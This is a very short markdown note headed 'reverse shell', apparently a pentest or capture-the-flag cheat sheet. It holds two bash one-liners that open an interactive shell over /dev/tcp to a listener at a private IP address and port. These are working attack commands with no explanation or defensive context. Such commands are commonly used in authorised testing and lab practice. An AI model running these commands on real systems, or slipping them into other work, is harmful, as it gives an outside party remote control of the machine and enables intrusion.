## reverse shell

/bin/bash -l > /dev/tcp/192.168.49.202/18000 0<&1 2>&1

/usr/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/9999 0>&1'
